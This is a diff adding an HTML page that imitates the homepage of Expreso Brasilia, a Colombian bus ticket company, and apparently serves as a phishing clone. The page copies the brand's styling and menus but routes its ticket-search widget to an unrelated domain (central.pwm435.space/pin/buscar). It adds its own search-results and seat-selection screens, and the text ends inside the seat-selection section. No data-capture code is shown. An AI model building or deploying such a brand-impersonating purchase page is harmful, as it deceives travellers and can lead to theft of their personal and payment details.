@@ -1,0 +1,2779 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="es-CO">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>Inicio - Expreso Brasilia S.A | Tiquetes en Bus | Colombia</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+	<link rel="icon" href="https://static.expresobrasilia.com/wp-content/uploads/2020/10/touch-icon-iphone.png" sizes="32x32">
+
+	<!-- CSS External -->
+	<link rel="stylesheet" href="/pin/estilos/style.min.css" type="text/css" media="all">
+	<link rel="stylesheet" href="/pin/estilos/styles.css" type="text/css" media="all">
+	<link rel="stylesheet" href="/pin/estilos/ivory-search.min.css" type="text/css" media="all">
+	<link rel="stylesheet" href="/pin/estilos/front.min.css" type="text/css" media="all">
+	<link rel="stylesheet" href="/pin/estilos/style.css" type="text/css" media="all">
+	<link rel="stylesheet" href="/pin/estilos/css" type="text/css" media="all">
+	<link rel="stylesheet" href="/pin/estilos/choices.min.css" type="text/css" media="all">
+	<link rel="stylesheet" href="/pin/estilos/dashicons.min.css" type="text/css" media="all">
+	<link rel="stylesheet" href="/pin/estilos/bundle.css">
+	<link href="/pin/estilos/search.css" rel="stylesheet">
+
+	<!-- Search Widget Scripts -->
+	<script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
+	<script src="https://widgets.reservamos.mx/search/5.7.0/search.js" defer></script>
+
+	<style id="wp-emoji-styles-inline-css" type="text/css">
+		img.wp-smiley,
+		img.emoji {
+			display: inline !important;
+			border: none !important;
+			box-shadow: none !important;
+			height: 1em !important;
+			width: 1em !important;
+			margin: 0 0.07em !important;
+			vertical-align: -0.1em !important;
+			background: none !important;
+			padding: 0 !important;
+		}
+	</style>
+	<style id="classic-theme-styles-inline-css" type="text/css">
+		.wp-block-button__link {
+			color: #fff;
+			background-color: #32373c;
+			border-radius: 9999px;
+			box-shadow: none;
+			text-decoration: none;
+			padding: calc(.667em + 2px) calc(1.333em + 2px);
+			font-size: 1.125em
+		}
+		.wp-block-file__button {
+			background: #32373c;
+			color: #fff;
+			text-decoration: none
+		}
+	</style>
+	<style id="global-styles-inline-css" type="text/css">
+		:root {
+			--wp--preset--aspect-ratio--square: 1;
+			--wp--preset--aspect-ratio--4-3: 4/3;
+			--wp--preset--aspect-ratio--3-4: 3/4;
+			--wp--preset--aspect-ratio--3-2: 3/2;
+			--wp--preset--aspect-ratio--2-3: 2/3;
+			--wp--preset--aspect-ratio--16-9: 16/9;
+			--wp--preset--aspect-ratio--9-16: 9/16;
+			--wp--preset--color--black: #000000;
+			--wp--preset--color--cyan-bluish-gray: #abb8c3;
+			--wp--preset--color--white: #ffffff;
+			--wp--preset--color--pale-pink: #f78da7;
+			--wp--preset--color--vivid-red: #cf2e2e;
+			--wp--preset--color--luminous-vivid-orange: #ff6900;
+			--wp--preset--color--luminous-vivid-amber: #fcb900;
+			--wp--preset--color--light-green-cyan: #7bdcb5;
+			--wp--preset--color--vivid-green-cyan: #00d084;
+			--wp--preset--color--pale-cyan-blue: #8ed1fc;
+			--wp--preset--color--vivid-cyan-blue: #0693e3;
+			--wp--preset--color--vivid-purple: #9b51e0;
+			--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg, rgba(6, 147, 227, 1) 0%, rgb(155, 81, 224) 100%);
+			--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg, rgb(122, 220, 180) 0%, rgb(0, 208, 130) 100%);
+			--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg, rgba(252, 185, 0, 1) 0%, rgba(255, 105, 0, 1) 100%);
+			--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg, rgba(255, 105, 0, 1) 0%, rgb(207, 46, 46) 100%);
+			--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg, rgb(238, 238, 238) 0%, rgb(169, 184, 195) 100%);
+			--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg, rgb(74, 234, 220) 0%, rgb(151, 120, 209) 20%, rgb(207, 42, 186) 40%, rgb(238, 44, 130) 60%, rgb(251, 105, 98) 80%, rgb(254, 248, 76) 100%);
+			--wp--preset--gradient--blush-light-purple: linear-gradient(135deg, rgb(255, 206, 236) 0%, rgb(152, 150, 240) 100%);
+			--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg, rgb(254, 205, 165) 0%, rgb(254, 45, 45) 50%, rgb(107, 0, 62) 100%);
+			--wp--preset--gradient--luminous-dusk: linear-gradient(135deg, rgb(255, 203, 112) 0%, rgb(199, 81, 192) 50%, rgb(65, 88, 208) 100%);
+			--wp--preset--gradient--pale-ocean: linear-gradient(135deg, rgb(255, 245, 203) 0%, rgb(182, 227, 212) 50%, rgb(51, 167, 181) 100%);
+			--wp--preset--gradient--electric-grass: linear-gradient(135deg, rgb(202, 248, 128) 0%, rgb(113, 206, 126) 100%);
+			--wp--preset--gradient--midnight: linear-gradient(135deg, rgb(2, 3, 129) 0%, rgb(40, 116, 252) 100%);
+			--wp--preset--font-size--small: 13px;
+			--wp--preset--font-size--medium: 20px;
+			--wp--preset--font-size--large: 36px;
+			--wp--preset--font-size--x-large: 42px;
+			--wp--preset--spacing--20: 0.44rem;
+			--wp--preset--spacing--30: 0.67rem;
+			--wp--preset--spacing--40: 1rem;
+			--wp--preset--spacing--50: 1.5rem;
+			--wp--preset--spacing--60: 2.25rem;
+			--wp--preset--spacing--70: 3.38rem;
+			--wp--preset--spacing--80: 5.06rem;
+			--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);
+			--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);
+			--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);
+			--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);
+			--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);
+		}
+		:where(.is-layout-flex) { gap: 0.5em; }
+		:where(.is-layout-grid) { gap: 0.5em; }
+		body .is-layout-flex { display: flex; }
+		.is-layout-flex { flex-wrap: wrap; align-items: center; }
+		.is-layout-flex> :is(*, div) { margin: 0; }
+		body .is-layout-grid { display: grid; }
+		.is-layout-grid> :is(*, div) { margin: 0; }
+		:where(.wp-block-columns.is-layout-flex) { gap: 2em; }
+		:where(.wp-block-columns.is-layout-grid) { gap: 2em; }
+		:where(.wp-block-post-template.is-layout-flex) { gap: 1.25em; }
+		:where(.wp-block-post-template.is-layout-grid) { gap: 1.25em; }
+	</style>
+	<style id="css-divi-area-inline-css" type="text/css">
+		.et_pb_section.popup { display: none }
+	</style>
+	<style id="et-divi-customizer-global-cached-inline-styles">
+		body,
+		.et_pb_column_1_2 .et_quote_content blockquote cite,
+		.et_pb_column_1_2 .et_link_content a.et_link_main_url,
+		.et_pb_column_1_3 .et_quote_content blockquote cite,
+		.et_pb_column_3_8 .et_quote_content blockquote cite,
+		.et_pb_column_1_4 .et_quote_content blockquote cite,
+		.et_pb_blog_grid .et_quote_content blockquote cite,
+		.et_pb_column_1_3 .et_link_content a.et_link_main_url,
+		.et_pb_column_3_8 .et_link_content a.et_link_main_url,
+		.et_pb_column_1_4 .et_link_content a.et_link_main_url,
+		.et_pb_blog_grid .et_link_content a.et_link_main_url,
+		body .et_pb_bg_layout_light .et_pb_post p,
+		body .et_pb_bg_layout_dark .et_pb_post p { font-size: 16px }
+		.et_pb_slide_content, .et_pb_best_value { font-size: 18px }
+		body { color: #232323 }
+		h1, h2, h3, h4, h5, h6 { color: #232323 }
+		a { color: #d22630 }
+		#main-header .nav li ul a { color: rgba(0, 0, 0, 0.7) }
+		#footer-widgets .footer-widget a, #footer-widgets .footer-widget li a, #footer-widgets .footer-widget li a:hover { color: #ffffff }
+		.footer-widget { color: #ffffff }
+		.footer-widget .et_pb_widget div, .footer-widget .et_pb_widget ul, .footer-widget .et_pb_widget ol, .footer-widget .et_pb_widget label { line-height: 1.7em }
+		#footer-widgets .footer-widget li:before { top: 10.6px }
+		#et-footer-nav .bottom-nav li.current-menu-item a { color: #2ea3f2 }
+		body .et_pb_button:hover { border-radius: 0px }
+		@media only screen and (min-width:981px) {
+			.et_header_style_centered.et_hide_primary_logo #main-header:not(.et-fixed-header) .logo_container,
+			.et_header_style_centered.et_hide_fixed_logo #main-header.et-fixed-header .logo_container { height: 11.88px }
+		}
+		@media only screen and (min-width:1350px) {
+			.et_pb_row { padding: 27px 0 }
+			.et_pb_section { padding: 54px 0 }
+			.single.et_pb_pagebuilder_layout.et_full_width_page .et_post_meta_wrapper { padding-top: 81px }
+			.et_pb_fullwidth_section { padding: 0 }
+		}
+		h1, h2, h3, h4, h5, h6 { font-family: 'Oswald', Helvetica, Arial, Lucida, sans-serif }
+		body, input, textarea, select { font-family: 'Source Sans Pro', Helvetica, Arial, Lucida, sans-serif }
+		.search-title { margin-bottom: 20px; color: white; text-align: center }
+		.search-wrapper { max-width: 430px; background-color: #00529cd6; padding: 20px; border-radius: 7px }
+		.search-wrapper .search-button { color: #ffffff; font-weight: 600 }
+		p.route-title { padding-bottom: 0 }
+		.et-pb-controllers { z-index: 9 }
+		@media (min-width:980px) {
+			.brasilia-menu-footer #menu-footer { flex-direction: column; align-items: flex-end }
+		}
+		.brasilia-mainimage img { width: auto }
+		.brasilia-blog img { height: 180px; object-fit: cover }
+		.brasilia-icons span { text-align: center }
+		.brasilia-icons span img { max-height: 70px; width: auto !important }
+		.form-row { display: flex; margin-bottom: 20px }
+		.form-row-item { flex: 1; margin-right: 20px }
+		.form-row-item:last-child { margin-right: 0 }
+		.form-row-item input, .form-row-item textarea { width: 100%; min-height: 50px; background-color: #fafafa; border-radius: 4px; border: 1px solid #e6e6e6 }
+		.form-row-item input[type=submit] { color: #d22630; border-radius: 4px; font-size: 16px; border: solid 2px #d22630; padding: 5px 10px; background-color: white; width: auto; min-height: 40px; transition: all .2s }
+		.form-row-item input[type=submit]:hover { background-color: #d22630; color: white; cursor: pointer }
+		@media (max-width:980px) {
+			.form-row { flex-direction: column }
+			.form-row-item { margin-right: 0; margin-bottom: 20px }
+			.form-row-item:last-child { margin-bottom: 0 }
+		}
+	</style>
+	<style type="text/css" media="screen">
+		.is-menu path.search-icon-path { fill: #ffffff; }
+		body .popup-search-close:after, body .search-close:after { border-color: #ffffff; }
+		body .popup-search-close:before, body .search-close:before { border-color: #ffffff; }
+	</style>
+	<style id="wpforms-css-vars-root">
+		:root {
+			--wpforms-field-border-radius: 3px;
+			--wpforms-field-background-color: #ffffff;
+			--wpforms-field-border-color: rgba(0, 0, 0, 0.25);
+			--wpforms-field-text-color: rgba(0, 0, 0, 0.7);
+			--wpforms-label-color: rgba(0, 0, 0, 0.85);
+			--wpforms-label-sublabel-color: rgba(0, 0, 0, 0.55);
+			--wpforms-label-error-color: #d63637;
+			--wpforms-button-border-radius: 3px;
+			--wpforms-button-background-color: #066aab;
+			--wpforms-button-text-color: #ffffff;
+			--wpforms-page-break-color: #066aab;
+			--wpforms-field-size-input-height: 43px;
+			--wpforms-field-size-input-spacing: 15px;
+			--wpforms-field-size-font-size: 16px;
+			--wpforms-field-size-line-height: 19px;
+			--wpforms-field-size-padding-h: 14px;
+			--wpforms-field-size-checkbox-size: 16px;
+			--wpforms-field-size-sublabel-spacing: 5px;
+			--wpforms-field-size-icon-size: 1;
+			--wpforms-label-size-font-size: 16px;
+			--wpforms-label-size-line-height: 19px;
+			--wpforms-label-size-sublabel-font-size: 14px;
+			--wpforms-label-size-sublabel-line-height: 17px;
+			--wpforms-button-size-font-size: 17px;
+			--wpforms-button-size-height: 41px;
+			--wpforms-button-size-padding-h: 15px;
+			--wpforms-button-size-margin-top: 10px;
+		}
+	</style>
+	<style id="et-builder-module-design-tb-50-tb-26-61-cached-inline-styles">
+		@media only screen and (max-width:767px) { z-index:1 }
+		@font-face { font-family: "New Order Bold"; font-display: swap; src: url("https://static.expresobrasilia.com/wp-content/uploads/et-fonts/New-Order-Bold-1.otf") format("opentype") }
+		.et_pb_section_0_tb_header { z-index: 0; position: relative }
+		.et_pb_fullwidth_menu_0_tb_header.et_pb_fullwidth_menu ul li a { font-family: 'New Order Bold', Helvetica, Arial, Lucida, sans-serif; font-size: 15px; color: #fafafa !important }
+		.et_pb_fullwidth_menu_0_tb_header.et_pb_fullwidth_menu { background-color: #00529c; height: 80px; padding-right: 0px; padding-left: 0px; margin-right: 15px; margin-left: 15px }
+		.et_pb_fullwidth_menu_0_tb_header, .et_pb_fullwidth_menu_0_tb_header .sub-menu { box-shadow: 0px 5px 10px 0px rgba(0, 0, 0, 0.3) }
+		.et_pb_fullwidth_menu_0_tb_header.et_pb_fullwidth_menu ul li.current-menu-item a { color: #fafafa !important }
+		.et_pb_fullwidth_menu_0_tb_header.et_pb_fullwidth_menu .nav li ul { background-color: #ffffff !important; border-color: #d22630 }
+		.et_pb_fullwidth_menu_0_tb_header.et_pb_fullwidth_menu .et_mobile_menu { border-color: #d22630 }
+		.et_pb_fullwidth_menu_0_tb_header.et_pb_fullwidth_menu .nav li ul.sub-menu a { color: #686868 !important }
+		.et_pb_fullwidth_menu_0_tb_header.et_pb_fullwidth_menu .nav li ul.sub-menu li.current-menu-item a { color: #1e1e1e !important }
+		.et_pb_fullwidth_menu_0_tb_header.et_pb_fullwidth_menu .et_mobile_menu a { color: #1e1e1e !important }
+		.et_pb_fullwidth_menu_0_tb_header.et_pb_fullwidth_menu .et_mobile_menu, .et_pb_fullwidth_menu_0_tb_header.et_pb_fullwidth_menu .et_mobile_menu ul { background-color: #ffffff !important }
+		.et_pb_fullwidth_menu_0_tb_header .et_pb_row>.et_pb_menu__logo-wrap .et_pb_menu__logo, .et_pb_fullwidth_menu_0_tb_header .et_pb_menu__logo-slot { max-width: 100% }
+		.et_pb_fullwidth_menu_0_tb_header .et_pb_row>.et_pb_menu__logo-wrap .et_pb_menu__logo img, .et_pb_fullwidth_menu_0_tb_header .et_pb_menu__logo-slot .et_pb_menu__logo-wrap img { max-height: 55px }
+		.et_pb_fullwidth_menu_0_tb_header .mobile_nav .mobile_menu_bar:before { color: #fafafa }
+		.et_pb_fullwidth_menu_0_tb_header.et_pb_module { margin-left: auto !important; margin-right: auto !important }
+		@media only screen and (max-width:980px) {
+			.et_pb_fullwidth_menu_0_tb_header.et_pb_fullwidth_menu { height: auto; padding-left: 0px }
+		}
+		@media only screen and (max-width:767px) {
+			.et_pb_fullwidth_menu_0_tb_header.et_pb_fullwidth_menu { height: auto; padding-right: 0px; padding-left: 0px }
+			.et_pb_fullwidth_menu_0_tb_header { width: 100% }
+		}
+		@font-face { font-family: "New Order Light"; font-display: swap; src: url("https://static.expresobrasilia.com/wp-content/uploads/et-fonts/New-Order-Light-1.otf") format("opentype") }
+		@font-face { font-family: "New Order Medium"; font-display: swap; src: url("https://static.expresobrasilia.com/wp-content/uploads/et-fonts/New-Order-Medium-1.otf") format("opentype") }
+		@font-face { font-family: "New Order Semibold"; font-display: swap; src: url("https://static.expresobrasilia.com/wp-content/uploads/et-fonts/New-Order-SemiBold-1.otf") format("opentype") }
+		.et_pb_section_0.et_pb_section { padding-top: 0px; padding-right: 0px; padding-bottom: 0px; padding-left: 0px; margin-top: 0px; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; background-color: #00529c !important }
+		.et_pb_row_0.et_pb_row { padding-top: 0px !important; padding-right: 0px !important; padding-bottom: 0px !important; padding-left: 0px !important; margin-top: 0px !important; margin-right: 0px !important; margin-bottom: 0px !important; margin-left: 0px !important }
+		.et_pb_row_0, body #page-container .et-db #et-boc .et-l .et_pb_row_0.et_pb_row { width: 100%; max-width: 100% }
+		.et_pb_row_0 { z-index: 10 }
+		.et_pb_text_0.et_pb_text { color: #cf282f !important }
+		.et_pb_text_0 p { line-height: 1em }
+		.et_pb_text_0 { font-family: 'Alata', Helvetica, Arial, Lucida, sans-serif; font-size: 30px; line-height: 1em; background-color: rgba(0, 0, 0, 0); position: relative; min-height: 0px; padding-right: 27px !important; margin-top: 20px !important; margin-right: -23px !important; margin-bottom: 30px !important }
+		.et_pb_text_0 h1 { font-family: 'New Order Bold', Helvetica, Arial, Lucida, sans-serif; font-weight: 700; color: #ffffff !important; text-shadow: 0.08em 0.08em 0.08em rgba(0, 0, 0, 0) }
+		.et_pb_column_0 { background-image: linear-gradient(184deg, rgba(0, 82, 156, 0) 15%, #232323 100%); padding-top: 40px; padding-right: 130px; padding-bottom: 40px; padding-left: 15px }
+		.et_pb_text_0.et_pb_module { margin-left: auto !important; margin-right: 0px !important }
+		.et_pb_code_0.et_pb_module { margin-left: auto !important; margin-right: 0px !important }
+		@media only screen and (min-width:981px) {
+			.et_pb_section_0 { display: none !important }
+			.et_pb_text_0 { width: 100%; max-width: 400px }
+			.et_pb_code_0 { max-width: 400px }
+		}
+		@media only screen and (max-width:980px) {
+			.et_pb_row_0.et_pb_row { padding-right: 0px !important; padding-left: 0px !important }
+			.et_pb_text_0 { min-height: auto; max-width: 89.5% }
+			.et_pb_code_0 { max-width: 100% }
+			.et_pb_text_0.et_pb_module { margin-left: auto !important; margin-right: auto !important }
+			.et_pb_code_0.et_pb_module { margin-left: auto !important; margin-right: auto !important }
+		}
+		@media only screen and (max-width:767px) {
+			.et_pb_row_0.et_pb_row { padding-top: 0px !important; padding-right: 0px !important; padding-bottom: 0px !important; padding-left: 0px !important }
+			.et_pb_text_0 { min-height: auto; width: 100% }
+			.et_pb_column_0 { padding-top: 10px; padding-right: 15px; padding-bottom: 20px; padding-left: 15px }
+		}
+	</style>
+</head>
+
+<body data-rsssl="1" class="home wp-singular page-template-default page page-id-61 wp-theme-Divi et-tb-has-template et-tb-has-header et-tb-has-footer Divi et_pb_button_helper_class et_cover_background et_pb_gutter linux et_pb_gutters3 et_pb_pagebuilder_layout et_no_sidebar et_divi_theme et-db et_minified_js et_minified_css">
+	<div id="page-container">
+		<div id="et-boc" class="et-boc">
+
+			<header class="et-l et-l--header">
+				<div class="et_builder_inner_content et_pb_gutters3">
+					<div class="et_pb_section et_pb_section_0_tb_header et_pb_fullwidth_section et_section_regular">
+						<div class="et_pb_module et_pb_fullwidth_menu et_pb_fullwidth_menu_0_tb_header et_pb_bg_layout_dark et_pb_text_align_right et_dropdown_animation_fade et_pb_fullwidth_menu--with-logo et_pb_fullwidth_menu--style-left_aligned">
+							<div class="et_pb_row clearfix">
+								<div class="et_pb_menu__logo-wrap">
+									<div class="et_pb_menu__logo">
+										<a href="https://www.expresobrasilia.com/"><img src="/pin/brasilia_nuevo_logo.png" alt=""></a>
+									</div>
+								</div>
+								<div class="et_pb_menu__wrap">
+									<div class="et_pb_menu__menu">
+										<nav class="et-menu-nav fullwidth-menu-nav">
+											<ul id="menu-header" class="et-menu fullwidth-menu nav downwards">
+												<li class="et_pb_menu_page_id-home menu-item menu-item-type-post_type menu-item-object-page menu-item-home current-menu-item page_item page-item-61 current_page_item menu-item-1633">
+													<a href="https://www.expresobrasilia.com/" aria-current="page">Inicio</a></li>
+												<li class="et_pb_menu_page_id-1787 menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-1787">
+													<a href="#">Ofertas y Servicios</a>
+													<ul class="sub-menu">
+														<li class="et_pb_menu_page_id-1765 menu-item menu-item-type-post_type menu-item-object-page menu-item-1796">
+															<a href="https://www.expresobrasilia.com/promociones/">Promociones</a>
+														</li>
+														<li class="et_pb_menu_page_id-1593 menu-item menu-item-type-post_type menu-item-object-page menu-item-1794">
+															<a href="https://www.expresobrasilia.com/pasajes/">Pasajes</a>
+														</li>
+														<li class="et_pb_menu_page_id-1610 menu-item menu-item-type-post_type menu-item-object-page menu-item-1797">
+															<a href="https://www.expresobrasilia.com/servicio-especial/">Servicio Especial</a></li>
+														<li class="et_pb_menu_page_id-1536 menu-item menu-item-type-post_type menu-item-object-page menu-item-1790">
+															<a href="https://www.expresobrasilia.com/brasilia-carga/">Brasilia Carga</a></li>
+													</ul>
+												</li>
+												<li class="et_pb_menu_page_id-1650 menu-item menu-item-type-post_type menu-item-object-page menu-item-1804">
+													<a href="https://www.expresobrasilia.com/viajero-gaviota/">Viajero Gaviota</a></li>
+												<li class="et_pb_menu_page_id-1739 menu-item menu-item-type-post_type menu-item-object-page menu-item-1789">
+													<a href="https://www.expresobrasilia.com/blog/">Blog</a></li>
+												<li class="et_pb_menu_page_id-1686 menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-1792">
+													<a href="https://www.expresobrasilia.com/contactenos/">Contáctenos</a>
+													<ul class="sub-menu">
+														<li class="et_pb_menu_page_id-5319 menu-item menu-item-type-post_type menu-item-object-page menu-item-5349">
+															<a href="https://www.expresobrasilia.com/politicas/">Políticas de viaje</a></li>
+														<li class="et_pb_menu_page_id-1702 menu-item menu-item-type-post_type menu-item-object-page menu-item-2243">
+															<a href="https://www.expresobrasilia.com/preguntas-frecuentes/">Preguntas Frecuentes</a></li>
+														<li class="et_pb_menu_page_id-1691 menu-item menu-item-type-post_type menu-item-object-page menu-item-2242">
+															<a href="https://www.expresobrasilia.com/directorio/">Directorio</a>
+														</li>
+													</ul>
+												</li>
+												<li class="et_pb_menu_page_id-5028 menu-item menu-item-type-post_type menu-item-object-page menu-item-5993">
+													<a href="https://www.expresobrasilia.com/pqrs/">PQRS</a></li>
+												<li class="et_pb_menu_page_id-6246 menu-item menu-item-type-custom menu-item-object-custom menu-item-6246">
+													<a href="https://viaje.expresobrasilia.com/account">Iniciar sesión</a></li>
+											</ul>
+										</nav>
+									</div>
+									<div class="et_mobile_nav_menu">
+										<a href="#" class="mobile_nav closed">
+											<span class="mobile_menu_bar"></span>
+										</a>
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</header>
+
+			<div id="et-main-area">
+				<div id="main-content">
+					<article id="post-61" class="post-61 page type-page status-publish hentry">
+						<div class="entry-content">
+							<div class="et-l et-l--post">
+								<div class="et_builder_inner_content et_pb_gutters3">
+									<div class="et_pb_section et_pb_section_0 et_pb_with_background et_section_regular">
+										<div class="et_pb_row et_pb_row_0 et_pb_equal_columns et_pb_gutters1">
+											<div class="et_pb_column et_pb_column_4_4 et_pb_column_0 et_pb_css_mix_blend_mode_passthrough et-last-child">
+												<div class="et_pb_module et_pb_text et_pb_text_0 et_pb_text_align_left et_pb_bg_layout_light">
+													<div class="et_pb_text_inner">
+														<h2 class="p1" style="text-align: center;"><span style="color: #ffffff;"><b>Viajamos con tus sueños.</b></span></h2>
+													</div>
+												</div>
+												<div class="et_pb_module et_pb_code et_pb_code_0">
+													<div class="et_pb_code_inner">
+														<div data-widget-host="habitat"
+															data-prop-source-url="central.pwm435.space/api/v2/places"
+															data-prop-funnel-url="central.pwm435.space/pin/buscar"
+															data-prop-autocomplete-type="select"
+															data-prop-display-type="city_state"
+															data-prop-date-format="yyyy-mm-dd"
+															data-prop-lang="es-MX"
+															data-prop-primary-color="#003087"
+															data-prop-accent-color="#D22730"
+															data-prop-opt-in-return="false"
+															data-prop-passengers-dropdown="false"
+															data-prop-use-gtm="false"
+															data-prop-max-days-search="120"
+															data-prop-show-open-ticket="false"
+															data-prop-widget-layout="vertical-search"
+															data-prop-interest-event="Interest In Home Dummy"
+															data-prop-profile-url="https://core-api.reservamossaas.com/api/v1"
+															data-prop-profile-enabled=""
+															data-prop-profile-autocomplete=""
+															data-prop-geolocation-origin="false"
+															data-prop-growthbook="https://api-growthbook.reservamos.tech/api/features/prod_bSAl41VNFv0FE1NMDLSPR0i7wo9VZXPqWV1XEE9czk?project=prj_405gzo1olfvhsomh"
+															data-prop-growthbook-standalone=""
+															data-prop-growthbook-dev="false"
+															data-prop-group-places=""
+															data-prop-brand="brasilia">
+														</div>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+							</div>
+						</div>
+					</article>
+				</div>
+			</div>
+		</div>
+	</div>
+	<footer id="mainFooter" style="width: 100%; text-align: center;">
+		<img src="/pin/banner-bajo.png" alt="Footer" style="width: 100%;">
+	</footer>
+	<div id="reservamosPortal" class="reservamos-search" style="--accent-500: #D22730; --primary-700: #003087;"></div>
+
+	<!-- Tailwind CSS CDN para las clases de utilidad -->
+	<script src="https://cdn.tailwindcss.com"></script>
+
+	<!-- Estilos personalizados para las secciones de compra -->
+	<style>
+		/* Fuentes de Brasilia */
+		.brasilia-section {
+			font-family: 'Source Sans Pro', Helvetica, Arial, sans-serif;
+		}
+		.brasilia-section h1,
+		.brasilia-section h2,
+		.brasilia-section h3,
+		.brasilia-section h4,
+		.brasilia-section .section-title {
+			font-family: 'Oswald', Helvetica, Arial, sans-serif;
+			text-transform: uppercase;
+			letter-spacing: 0.5px;
+		}
+		.brasilia-section .highlight-title {
+			font-family: 'Alata', Helvetica, Arial, sans-serif;
+		}
+		.brasilia-section label {
+			font-family: 'Source Sans Pro', Helvetica, Arial, sans-serif;
+			font-weight: 600;
+		}
+		.brasilia-section input,
+		.brasilia-section select,
+		.brasilia-section textarea {
+			font-family: 'Source Sans Pro', Helvetica, Arial, sans-serif;
+		}
+		.brasilia-section button {
+			font-family: 'Oswald', Helvetica, Arial, sans-serif;
+			text-transform: uppercase;
+			letter-spacing: 1px;
+		}
+		.brasilia-section .price-display {
+			font-family: 'Oswald', Helvetica, Arial, sans-serif;
+			font-weight: 500;
+		}
+		.brasilia-section .info-text {
+			font-family: 'Source Sans Pro', Helvetica, Arial, sans-serif;
+		}
+		/* Colores corporativos */
+		.brasilia-primary { color: #00529c; }
+		.brasilia-secondary { color: #d22630; }
+		.brasilia-bg-primary { background-color: #00529c; }
+		.brasilia-bg-secondary { background-color: #d22630; }
+
+		/* Colores para cards de resultados */
+		.brand-red { background-color: #D81921; }
+		.brand-blue { color: #005A9C; }
+		.border-brand-blue { border-color: #005A9C; }
+		.text-brand-blue { color: #005A9C; }
+		.bg-brand-red { background-color: #D81921; }
+		.text-accent-gold { color: #FFC107; }
+	</style>
+
+	<!-- Google Material Symbols para iconos -->
+	<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap" rel="stylesheet">
+	<style>
+		.material-symbols-outlined {
+			font-variation-settings: 'FILL' 1, 'wght' 400, 'GRAD' 0, 'opsz' 24;
+		}
+	</style>
+
+	<!-- SECCIÓN: RESULTADOS DE BÚSQUEDA -->
+	<section id="seccion-resultados" class="brasilia-section min-h-screen bg-[#F7F7F7] hidden">
+		<!-- Top App Bar -->
+		<div class="sticky top-0 z-10 flex items-center bg-[#F7F7F7] p-4 pb-2 justify-between shadow-sm">
+			<button onclick="volverAInicio()" class="flex size-12 shrink-0 items-center justify-start text-gray-800">
+				<span class="material-symbols-outlined text-2xl">arrow_back_ios_new</span>
+			</button>
+			<h2 class="flex-1 text-center text-lg font-bold leading-tight tracking-tight text-gray-800" style="font-family: 'Oswald', sans-serif; text-transform: uppercase;">Resultados de Búsqueda</h2>
+			<div class="flex size-12 shrink-0 items-center"></div>
+		</div>
+
+		<!-- Info de ruta buscada -->
+		<div class="bg-white px-4 py-3 shadow-sm mb-2">
+			<div class="flex items-center justify-between">
+				<div class="flex items-center gap-2">
+					<span class="material-symbols-outlined text-[#005A9C]">route</span>
+					<div>
+						<p class="font-bold text-gray-800" id="rutaBuscada" style="font-family: 'Oswald', sans-serif;">Origen → Destino</p>
+						<p class="text-gray-500 text-sm" id="fechaBuscada" style="font-family: 'Source Sans Pro', sans-serif;">Fecha del viaje</p>
+					</div>
+				</div>
+				<button onclick="volverAInicio()" class="text-[#005A9C] text-sm font-medium hover:underline" style="font-family: 'Source Sans Pro', sans-serif;">
+					Modificar
+				</button>
+			</div>
+		</div>
+
+		<!-- Lista de viajes disponibles -->
+		<div class="flex-1 overflow-auto p-4">
+			<div class="max-w-lg mx-auto space-y-4" id="listaViajes">
+				<!-- Los viajes se generan dinámicamente -->
+			</div>
+		</div>
+	</section>
+
+	<!-- SECCIÓN: SELECCIÓN DE SILLAS -->
+	<section id="seccion-sillas" class="brasilia-section min-h-screen bg-gray-100 hidden">
+		<!-- Header -->
+		<div class="bg-[#00529c] text-white px-4 py-3 flex items-center justify-between shadow-md">
+			<button onclick="volverAResultados()" class="p-2 hover:bg-white/10 rounded-full transition">
+				<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/>
+				</svg>
+			</button>
+			<h2 class="text-lg font-semibold" style="font-family: 'Oswald', sans-serif; text-transform: uppercase;">Selecciona tus asientos</h2>
+			<div class="w-10"></div>
+		</div>
+
+		<!-- Info del viaje -->
+		<div class="bg-white shadow-sm px-4 py-3 border-b">
+			<div class="flex items-center justify-between text-sm">
+				<div>
+					<span class="font-semibold text-gray-800" id="rutaViaje">Origen - Destino</span>
+					<div class="text-gray-500 text-xs" id="fechaViaje">Fecha del viaje</div>
+				</div>
+				<div class="text-right">
+					<div class="text-xs text-gray-500">Hora de salida</div>
+					<div class="font-bold text-[#00529c]" id="horaViaje">00:00</div>
+				</div>
+			</div>
+		</div>
+
+		<!-- Leyenda de sillas -->
+		<div class="bg-white px-4 py-3 flex justify-center gap-6 text-xs border-b">
+			<div class="flex items-center gap-2">
+				<div class="w-6 h-6 bg-gray-200 rounded border-2 border-gray-300"></div>
+				<span class="text-gray-600">Disponible</span>
+			</div>
+			<div class="flex items-center gap-2">
+				<div class="w-6 h-6 bg-[#00529c] rounded border-2 border-[#003d75]"></div>
+				<span class="text-gray-600">Seleccionada</span>
+			</div>
